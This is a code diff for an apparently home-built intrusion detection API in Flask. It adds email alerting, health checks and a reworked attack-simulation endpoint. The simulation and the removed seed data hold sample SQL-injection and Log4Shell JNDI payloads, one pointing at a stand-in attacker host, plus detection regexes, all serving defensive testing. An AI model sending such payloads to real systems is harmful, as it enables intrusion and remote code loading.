@@ -5,16 +5,30 @@ Includes graceful fallback if Redis or MongoDB are not yet started.
 """
 
 import os
+import smtplib
 import sys
+from pathlib import Path
+
+from dotenv import load_dotenv
+
+load_dotenv(Path(__file__).resolve().parents[1] / ".env", override=False)
+
+# Ensure self-referential imports from routes resolve to this exact running module instance
+sys.modules["app"] = sys.modules[__name__]
 import logging
 from datetime import datetime
 from flask import Flask, jsonify, render_template
 from flask_cors import CORS
 from flask_socketio import SocketIO
-from flask_jwt_extended import JWTManager
+from flask_jwt_extended import JWTManager, jwt_required
 from flask_sqlalchemy import SQLAlchemy
+from pymongo.errors import PyMongoError
+from redis.exceptions import RedisError
+from sqlalchemy import text
+from sqlalchemy.exc import SQLAlchemyError
 
 from config import Config
+from email_notifications import missing_email_settings, send_alert_email, should_email_alert
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] [API] %(message)s")
 logger = logging.getLogger("API")
@@ -25,103 +39,44 @@ logger = logging.getLogger("API")
 app = Flask(__name__)
 app.config.from_object(Config)
 
-# Auto fallback to SQLite if PostgreSQL URL is default and PostgreSQL is not up
-db_uri = app.config.get("SQLALCHEMY_DATABASE_URI", "")
-if "postgresql" in db_uri:
-    try:
-        import psycopg2
-        import socket
-        host = app.config.get("POSTGRES_HOST", "localhost")
-        port = int(app.config.get("POSTGRES_PORT", 5432))
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1.0)
-        s.connect((host, port))
-        s.close()
-        logger.info(f"Connected to PostgreSQL service at {host}:{port}")
-    except Exception:
-        logger.warning("PostgreSQL not responding on port 5432. Falling back to local SQLite database (ids_ips.db)")
-        sqlite_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "ids_ips.db"))
-        app.config["SQLALCHEMY_DATABASE_URI"] = f"sqlite:///{sqlite_path}"
-
 CORS(app, resources={r"/*": {"origins": "*"}})
 jwt = JWTManager(app)
 db = SQLAlchemy(app)
+with app.app_context():
+    with db.engine.connect():
+        logger.info("Connected to the configured SQL database.")
 
 # Use standard thread-safe async mode (compatible across all Python versions)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
 
-# MongoDB connection with safe in-memory fallback mock
-try:
-    from pymongo import MongoClient
-    mongo_client = MongoClient(app.config.get("MONGO_URI", "mongodb://localhost:27017"), serverSelectionTimeoutMS=1000)
-    mongo_client.server_info()
-    mongo_db = mongo_client[app.config.get("MONGO_DB", "ids_ips")]
-    logger.info("Connected to MongoDB service.")
-except Exception:
-    logger.warning("MongoDB not responding on port 27017. Using in-memory NoSQL document cache.")
-    class MockCollection:
-        def __init__(self, name):
-            self.name = name
-            self.docs = []
-        def insert_one(self, doc):
-            doc["_id"] = str(len(self.docs) + 1)
-            self.docs.append(doc)
-            return type("Obj", (), {"inserted_id": doc["_id"]})
-        def find(self, query=None):
-            class MockCursor:
-                def __init__(self, items): self.items = items
-                def sort(self, *a, **kw): return self
-                def limit(self, n): return self.items[:n]
-                def __iter__(self): return iter(self.items)
-            return MockCursor(list(reversed(self.docs)))
-        def find_one(self, q):
-            return self.docs[-1] if self.docs else None
-        def estimated_document_count(self):
-            return len(self.docs)
+_missing_email_settings = missing_email_settings()
+if _missing_email_settings:
+    logger.warning(
+        "High/critical email notifications are disabled; configure: %s",
+        ", ".join(_missing_email_settings),
+    )
+else:
+    logger.info("High/critical email notifications are enabled.")
 
-    class MockMongo:
-        def __init__(self):
-            self.cols = {}
-        def __getitem__(self, name):
-            if name not in self.cols: self.cols[name] = MockCollection(name)
-            return self.cols[name]
-        def __getattr__(self, name):
-            return self[name]
-        def list_collection_names(self):
-            return ["raw_packets", "threat_intel_raw", "canary_access_log", "dns_query_log"]
+from pymongo import MongoClient
 
-    mongo_db = MockMongo()
+mongo_client = MongoClient(
+    app.config.get("MONGO_URI", "mongodb://localhost:27017"),
+    serverSelectionTimeoutMS=5000,
+)
+mongo_client.admin.command("ping")
+mongo_db = mongo_client[app.config.get("MONGO_DB", "idsips")]
+logger.info("Connected to MongoDB.")
 
-# Redis connection with safe in-memory fallback mock
-try:
-    import redis
-    redis_client = redis.Redis.from_url(app.config.get("REDIS_URL", "redis://localhost:6379/0"), decode_responses=True, socket_timeout=1)
-    redis_client.ping()
-    logger.info("Connected to Redis service.")
-except Exception:
-    logger.warning("Redis not responding on port 6379. Using in-memory thread-safe hot-path cache.")
-    class MockRedis:
-        def __init__(self):
-            self._sets = {}
-            self._kv = {}
-        def sadd(self, name, *values):
-            if name not in self._sets: self._sets[name] = set()
-            for v in values: self._sets[name].add(str(v))
-        def sismember(self, name, value):
-            return str(value) in self._sets.get(name, set())
-        def smembers(self, name):
-            return self._sets.get(name, set())
-        def srem(self, name, *values):
-            for v in values: self._sets.get(name, set()).discard(str(v))
-        def set(self, k, v, ex=None):
-            self._kv[k] = str(v)
-        def get(self, k):
-            return self._kv.get(k)
-        def delete(self, k):
-            self._kv.pop(k, None)
-        def ping(self):
-            return True
-    redis_client = MockRedis()
+import redis
+
+redis_client = redis.Redis.from_url(
+    app.config.get("REDIS_URL", "redis://localhost:6379/0"),
+    decode_responses=True,
+    socket_timeout=5,
+)
+redis_client.ping()
+logger.info("Connected to Redis.")
 
 # -----------------------------------------------------------------------------
 # Register Route Blueprints
@@ -149,171 +104,83 @@ app.register_blueprint(compliance_bp)
 app.register_blueprint(stats_bp)
 app.register_blueprint(nosql_bp)
 
-# Auto-initialize SQLite tables if using SQLite fallback
-with app.app_context():
-    if "sqlite" in app.config.get("SQLALCHEMY_DATABASE_URI", ""):
-        from sqlalchemy import text
-        try:
-            with db.engine.begin() as conn:
-                conn.execute(text("""
-                    CREATE TABLE IF NOT EXISTS alerts (
-                        id INTEGER PRIMARY KEY AUTOINCREMENT,
-                        tenant_id INTEGER DEFAULT 1,
-                        rule_id INTEGER,
-                        rule_type TEXT,
-                        severity TEXT DEFAULT 'HIGH',
-                        src_ip TEXT NOT NULL,
-                        dst_ip TEXT NOT NULL,
-                        src_port INTEGER,
-                        dst_port INTEGER,
-                        protocol TEXT,
-                        packet_summary TEXT,
-                        enrichment TEXT DEFAULT '{}',
-                        status TEXT DEFAULT 'open',
-                        assigned_to TEXT,
-                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                        closed_at TIMESTAMP
-                    );
-                """))
-                conn.execute(text("""
-                    CREATE TABLE IF NOT EXISTS blocked_ips (
-                        id INTEGER PRIMARY KEY AUTOINCREMENT,
-                        tenant_id INTEGER DEFAULT 1,
-                        ip TEXT NOT NULL,
-                        reason TEXT NOT NULL,
-                        alert_id INTEGER,
-                        expires_at TIMESTAMP,
-                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                        created_by TEXT DEFAULT 'engine',
-                        active BOOLEAN DEFAULT 1
-                    );
-                """))
-                conn.execute(text("""
-                    CREATE TABLE IF NOT EXISTS sessions (
-                        id INTEGER PRIMARY KEY AUTOINCREMENT,
-                        tenant_id INTEGER DEFAULT 1,
-                        src_ip TEXT NOT NULL,
-                        dst_ip TEXT NOT NULL,
-                        src_port INTEGER,
-                        dst_port INTEGER,
-                        protocol TEXT,
-                        state TEXT DEFAULT 'ACTIVE',
-                        bytes_sent INTEGER DEFAULT 0,
-                        bytes_recv INTEGER DEFAULT 0,
-                        packets_sent INTEGER DEFAULT 0,
-                        packets_recv INTEGER DEFAULT 0,
-                        started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                        last_seen_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                        flags TEXT DEFAULT '{}'
-                    );
-                """))
-                conn.execute(text("""
-                    CREATE TABLE IF NOT EXISTS correlation_rules (
-                        id INTEGER PRIMARY KEY AUTOINCREMENT,
-                        tenant_id INTEGER DEFAULT 1,
-                        name TEXT NOT NULL,
-                        description TEXT,
-                        rule_type TEXT NOT NULL,
-                        event_filter TEXT DEFAULT '{}',
-                        threshold_count INTEGER DEFAULT 5,
-                        window_seconds INTEGER DEFAULT 60,
-                        sequence_pattern TEXT,
-                        ratio_field TEXT,
-                        ratio_threshold REAL,
-                        action TEXT DEFAULT 'BLOCK',
-                        severity TEXT DEFAULT 'HIGH',
-                        playbook_id INTEGER,
-                        enabled BOOLEAN DEFAULT 1,
-                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                    );
-                """))
-                conn.execute(text("""
-                    CREATE TABLE IF NOT EXISTS dpi_signatures (
-                        id INTEGER PRIMARY KEY AUTOINCREMENT,
-                        tenant_id INTEGER DEFAULT 1,
-                        name TEXT NOT NULL,
-                        description TEXT,
-                        protocol TEXT DEFAULT 'ANY',
-                        layer INTEGER DEFAULT 7,
-                        pattern_type TEXT DEFAULT 'REGEX',
-                        pattern TEXT NOT NULL,
-                        severity TEXT DEFAULT 'HIGH',
-                        cve TEXT,
-                        action TEXT DEFAULT 'BLOCK',
-                        enabled BOOLEAN DEFAULT 1,
-                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                    );
-                """))
-                conn.execute(text("""
-                    CREATE TABLE IF NOT EXISTS compliance_checks (
-                        id INTEGER PRIMARY KEY AUTOINCREMENT,
-                        framework TEXT NOT NULL,
-                        check_name TEXT NOT NULL,
-                        description TEXT,
-                        check_query TEXT NOT NULL,
-                        expected_result TEXT DEFAULT '{"min_count": 0}',
-                        severity TEXT DEFAULT 'HIGH',
-                        last_run_at TIMESTAMP,
-                        last_status TEXT DEFAULT 'PASS',
-                        last_result TEXT DEFAULT '{}'
-                    );
-                """))
-                # Seed default correlation rules
-                conn.execute(text("""
-                    INSERT OR IGNORE INTO correlation_rules (id, name, description, rule_type, action, severity)
-                    VALUES 
-                    (1, 'SSH Brute Force Detection', 'Threshold >5 SYN on port 22 in 60s', 'THRESHOLD', 'BLOCK', 'HIGH'),
-                    (2, 'TCP Port Sweep Scan', 'Probing >15 distinct ports in 10s', 'THRESHOLD', 'BLOCK', 'HIGH'),
-                    (3, 'SYN Flood Attack', 'Excessive SYN packets from source', 'THRESHOLD', 'BLOCK', 'CRITICAL');
-                """))
-                # Seed default DPI signatures
-                conn.execute(text("""
-                    INSERT OR IGNORE INTO dpi_signatures (id, name, protocol, pattern, severity, action, cve)
-                    VALUES
-                    (1, 'SQL Injection - Generic UNION SELECT', 'HTTP', '(?i)(union(\\s+all)?\\s+select)', 'CRITICAL', 'BLOCK', 'CWE-89'),
-                    (2, 'Log4Shell JNDI Lookup', 'TCP', '\\$\\{(jndi|j\\$\\{:\\-n\\}di):(ldap|rmi|dns)', 'CRITICAL', 'BLOCK', 'CVE-2021-44228'),
-                    (3, 'EICAR Standard Antivirus Test String', 'ANY', 'X5O!P%@AP[4', 'MEDIUM', 'ALERT', 'EICAR-TEST');
-                """))
-                # Seed default compliance checks
-                conn.execute(text("""
-                    INSERT OR IGNORE INTO compliance_checks (id, framework, check_name, description, check_query, last_status)
-                    VALUES
-                    (1, 'PCI-DSS', '1.1.4 - Firewall Rule Review', 'Verify active rules exist in database', 'SELECT COUNT(*) FROM correlation_rules WHERE enabled = 1', 'PASS'),
-                    (2, 'HIPAA', '164.312(b) - Audit Controls', 'Ensure security event tracking is active', 'SELECT COUNT(*) FROM alerts', 'PASS'),
-                    (3, 'SOC2', 'CC6.1 - Perimeter Defense', 'Verify threat detection signatures active', 'SELECT COUNT(*) FROM dpi_signatures WHERE enabled = 1', 'PASS');
-                """))
-            logger.info("Local SQLite database initialized with seed rules, signatures, and compliance checks.")
-        except Exception as ex:
-            logger.error(f"Error initializing local SQLite schema: {ex}")
-
 # -----------------------------------------------------------------------------
 # WebSocket Background Broadcaster
 # -----------------------------------------------------------------------------
 def background_alert_emitter():
-    """Polls database for fresh alerts and pushes to connected UI clients."""
+    """Polls database for fresh alerts and active sessions, pushing to UI."""
     from sqlalchemy import text
     import time
-    last_id = 0
+    last_alert_id = 0
+    last_session_id = 0
+    with app.app_context():
+        email_last_alert_id = db.session.execute(
+            text("SELECT COALESCE(MAX(id), 0) FROM alerts")
+        ).scalar_one()
     while True:
         try:
             with app.app_context():
+                email_alerts = []
                 with db.engine.connect() as conn:
-                    res = conn.execute(
+                    # 1. Fetch fresh threat alerts
+                    alerts = conn.execute(
                         text("SELECT id, rule_type, severity, src_ip, dst_ip, src_port, dst_port, protocol, created_at FROM alerts WHERE id > :lid ORDER BY id ASC LIMIT 10"),
-                        {"lid": last_id}
+                        {"lid": last_alert_id}
                     ).fetchall()
-                    for r in res:
+                    for r in alerts:
                         alert_dict = {
                             "id": r[0], "rule_type": r[1], "severity": r[2],
                             "src_ip": str(r[3]), "dst_ip": str(r[4]), "src_port": r[5],
                             "dst_port": r[6], "protocol": r[7], "created_at": str(r[8])
                         }
-                        last_id = max(last_id, r[0])
+                        last_alert_id = max(last_alert_id, r[0])
                         socketio.emit("new_alert", alert_dict)
+                        if r[0] > email_last_alert_id:
+                            email_last_alert_id = r[0]
+                            if should_email_alert(alert_dict) and not _missing_email_settings:
+                                email_alerts.append(alert_dict)
+
+                    # 2. Fetch fresh network traffic sessions (websites, DNS, browsing)
+                    sessions = conn.execute(
+                        text("SELECT id, src_ip, dst_ip, src_port, dst_port, protocol, bytes_sent, last_seen_at FROM sessions WHERE id > :lsid ORDER BY id ASC LIMIT 25"),
+                        {"lsid": last_session_id}
+                    ).fetchall()
+                    for s in sessions:
+                        sess_dict = {
+                            "id": s[0], "src_ip": str(s[1]), "dst_ip": str(s[2]),
+                            "src_port": s[3], "dst_port": s[4], "protocol": s[5],
+                            "bytes": s[6], "time": str(s[7])
+                        }
+                        last_session_id = max(last_session_id, s[0])
+                        socketio.emit("new_session", sess_dict)
+
+                    # 3. Emit summary counts
+                    counts = conn.execute(
+                        text("""
+                            SELECT
+                                (SELECT COUNT(*) FROM alerts WHERE created_at >= NOW() - INTERVAL '24 hours'),
+                                (SELECT COUNT(*) FROM blocked_ips WHERE active = true),
+                                (SELECT COUNT(*) FROM sessions WHERE last_seen_at >= NOW() - INTERVAL '15 minutes')
+                        """)
+                    ).fetchone()
+                    if counts:
+                        socketio.emit("stats_update", {
+                            "alerts_today": counts[0],
+                            "blocked_ips": counts[1],
+                            "active_sessions": counts[2]
+                        })
+                for alert in email_alerts:
+                    try:
+                        send_alert_email(alert)
+                    except (smtplib.SMTPException, OSError, ValueError, RuntimeError) as exc:
+                        logger.exception(
+                            "Could not email alert %s; it remains available in the dashboard: %s",
+                            alert["id"],
+                            exc,
+                        )
         except Exception:
-            pass
-        socketio.sleep(2)
+            logger.exception("Failed to publish database-backed dashboard updates")
+        socketio.sleep(1)
 
 socketio.start_background_task(background_alert_emitter)
 
@@ -326,88 +193,121 @@ def index():
 
 @app.route("/health", methods=["GET"])
 def health():
+    from sqlalchemy import text
+
+    components = {}
+    try:
+        with db.engine.connect() as conn:
+            conn.execute(text("SELECT 1"))
+        components["postgres"] = "UP"
+    except SQLAlchemyError:
+        logger.exception("PostgreSQL readiness check failed")
+        components["postgres"] = "DOWN"
+
+    try:
+        mongo_client.admin.command("ping")
+        components["mongodb"] = "UP"
+    except PyMongoError:
+        logger.exception("MongoDB readiness check failed")
+        components["mongodb"] = "DOWN"
+
+    try:
+        redis_client.ping()
+        components["redis"] = "UP"
+    except RedisError:
+        logger.exception("Redis readiness check failed")
+        components["redis"] = "DOWN"
+
+    ready = all(status == "UP" for status in components.values())
     return jsonify({
-        "status": "UP",
+        "status": "UP" if ready else "DOWN",
         "service": "DB-IDS/IPS API",
-        "database_backend": "PostgreSQL" if "postgresql" in app.config.get("SQLALCHEMY_DATABASE_URI", "") else "SQLite (Self-Contained)",
+        "database_backend": "PostgreSQL",
+        "components": components,
         "timestamp": datetime.utcnow().isoformat()
-    })
+    }), (200 if ready else 503)
 
 # -----------------------------------------------------------------------------
 # In-App Threat Simulation Endpoint (For 1-Click Browser UI Testing)
 # -----------------------------------------------------------------------------
 @app.route("/api/simulate/<attack_type>", methods=["POST"])
+@jwt_required()
 def simulate_attack(attack_type):
     """Allows testing database triggers directly from the UI without terminal commands."""
     from sqlalchemy import text
-    import json
-    src_ip = "192.168.1.189"
+    source_ips = {
+        "sqli": "198.51.100.189",
+        "log4shell": "198.51.100.190",
+        "portscan": "198.51.100.191",
+        "sshbrute": "198.51.100.192",
+    }
+    src_ip = source_ips.get(attack_type, "198.51.100.193")
+    dst_ip = "192.0.2.10"
 
     if attack_type == "sqli":
-        summary = {"signature": "SQL Injection - Generic UNION SELECT", "cve": "CWE-89", "payload": "UNION SELECT username, password FROM users --"}
-        with db.engine.begin() as conn:
-            conn.execute(text("""
-                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, src_port, dst_port, protocol, packet_summary, status)
-                VALUES (1, 'DPI_SIGNATURE', 'CRITICAL', :src, '10.30.201.26', 49200, 1234, 'HTTP', :sum, 'open')
-            """), {"src": src_ip, "sum": json.dumps(summary)})
-            conn.execute(text("""
-                INSERT INTO blocked_ips (tenant_id, ip, reason, expires_at, created_by, active)
-                VALUES (1, :src, 'In-Database DPI Trigger: SQL Injection (CWE-89)', datetime('now', '+60 minutes'), 'Database_Trigger', 1)
-            """), {"src": src_ip})
-        return jsonify({"success": True, "message": "SQL Injection threat fired & blocked in database!"})
+        packets = [
+            (src_ip, dst_ip, 49200, 80, "TCP", "PSH,ACK", "UNION SELECT username, password FROM users --")
+        ]
 
     elif attack_type == "log4shell":
-        summary = {"signature": "Log4Shell JNDI Lookup", "cve": "CVE-2021-44228", "payload": "${jndi:ldap://evil.com/x}"}
-        with db.engine.begin() as conn:
-            conn.execute(text("""
-                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, src_port, dst_port, protocol, packet_summary, status)
-                VALUES (1, 'DPI_SIGNATURE', 'CRITICAL', :src, '10.30.201.26', 51230, 1234, 'TCP', :sum, 'open')
-            """), {"src": src_ip, "sum": json.dumps(summary)})
-            conn.execute(text("""
-                INSERT INTO blocked_ips (tenant_id, ip, reason, expires_at, created_by, active)
-                VALUES (1, :src, 'In-Database DPI Trigger: Log4Shell RCE (CVE-2021-44228)', datetime('now', '+120 minutes'), 'Database_Trigger', 1)
-            """), {"src": src_ip})
-        return jsonify({"success": True, "message": "Log4Shell RCE exploit fired & blocked in database!"})
+        packets = [
+            (src_ip, dst_ip, 51230, 8080, "TCP", "PSH,ACK", "${jndi:ldap://example.invalid/x}")
+        ]
 
     elif attack_type == "portscan":
-        with db.engine.begin() as conn:
-            conn.execute(text("""
-                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, dst_port, protocol, packet_summary, status)
-                VALUES (1, 'CORRELATION_RULE', 'HIGH', :src, '10.30.201.26', 1234, 'TCP', '{"rule_name": "TCP Port Sweep Scan", "unique_ports": 20}', 'open')
-            """), {"src": src_ip})
-            conn.execute(text("""
-                INSERT INTO blocked_ips (tenant_id, ip, reason, expires_at, created_by, active)
-                VALUES (1, :src, 'Sliding Window Correlation: 20 Ports Probed in 3s', datetime('now', '+60 minutes'), 'Database_Trigger', 1)
-            """), {"src": src_ip})
-        return jsonify({"success": True, "message": "Horizontal port sweep detected & attacker blocked in database!"})
+        packets = [
+            (src_ip, dst_ip, 55100, port, "TCP", "SYN", "")
+            for port in range(10000, 10015)
+        ]
 
     elif attack_type == "sshbrute":
-        with db.engine.begin() as conn:
-            conn.execute(text("""
-                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, dst_port, protocol, packet_summary, status)
-                VALUES (1, 'CORRELATION_RULE', 'HIGH', :src, '10.30.201.26', 22, 'TCP', '{"rule_name": "SSH Brute Force Detection", "attempts": 8}', 'open')
-            """), {"src": src_ip})
-            conn.execute(text("""
-                INSERT INTO blocked_ips (tenant_id, ip, reason, expires_at, created_by, active)
-                VALUES (1, :src, 'Triggered Playbook #1: SSH Brute Force Rate Exceeded', datetime('now', '+60 minutes'), 'Database_Playbook', 1)
-            """), {"src": src_ip})
-        return jsonify({"success": True, "message": "SSH Brute force burst detected & Playbook #1 executed!"})
+        packets = [
+            (src_ip, dst_ip, 58120 + attempt, 22, "TCP", "SYN", "")
+            for attempt in range(5)
+        ]
+
+    elif attack_type == "benign":
+        packets = [
+            ("192.0.2.11", "142.250.190.46", 52310, 443, "TCP", "ACK", ""),
+            ("192.0.2.11", "140.82.121.3", 52312, 443, "TCP", "ACK", ""),
+            ("192.0.2.11", "8.8.8.8", 53421, 53, "UDP", "", ""),
+        ]
 
     elif attack_type == "canary":
         with db.engine.begin() as conn:
-            conn.execute(text("""
-                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, dst_port, protocol, packet_summary, status)
-                VALUES (1, 'INSIDER_CANARY_ACCESSED', 'CRITICAL', '10.30.201.99', '127.0.0.1', 5432, 'POSTGRES', 
-                '{"canary_token": "AWS_ADMIN_VAULT_CANARY", "detection": "SELECT query executed on canary view", "user": "insider_suspect"}', 'open')
-            """))
+            conn.execute(text("SELECT * FROM canary_aws_admin_vault"))
         return jsonify({"success": True, "message": "Canary token query detected! Insider threat alert recorded in database!"})
 
-    return jsonify({"error": "Unknown attack type"}), 400
+    else:
+        return jsonify({"error": "Unknown attack type"}), 400
+
+    with db.engine.begin() as conn:
+        for packet in packets:
+            conn.execute(
+                text("""
+                    INSERT INTO ingress_packets
+                        (src_ip, dst_ip, src_port, dst_port, protocol, tcp_flags,
+                         packet_length, payload_text, payload_bytes, capture_source)
+                    VALUES
+                        (:src_ip, :dst_ip, :src_port, :dst_port, :protocol, :tcp_flags,
+                         :packet_length, :payload_text, :payload_bytes, 'simulation')
+                """),
+                {
+                    "src_ip": packet[0],
+                    "dst_ip": packet[1],
+                    "src_port": packet[2],
+                    "dst_port": packet[3],
+                    "protocol": packet[4],
+                    "tcp_flags": packet[5],
+                    "payload_text": packet[6],
+                    "payload_bytes": packet[6].encode("utf-8"),
+                    "packet_length": len(packet[6].encode("utf-8")) + 40,
+                },
+            )
+
+    return jsonify({"success": True, "message": f"{attack_type} packets submitted for PostgreSQL processing."})
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 1234))
-    logger.info("=========================================================")
-    logger.info(f"   DB-IDS/IPS DEDICATED UI ACTIVE: http://localhost:{port} ")
-    logger.info(f"   NETWORK ADDRESS: http://10.30.201.26:{port}              ")
-    logger.info("=========================================================")
+    logger.info("API listening on port %s; use the HTTPS dashboard gateway on port 8443.", port)
     socketio.run(app, host="0.0.0.0", port=port, debug=False, allow_unsafe_werkzeug=True)
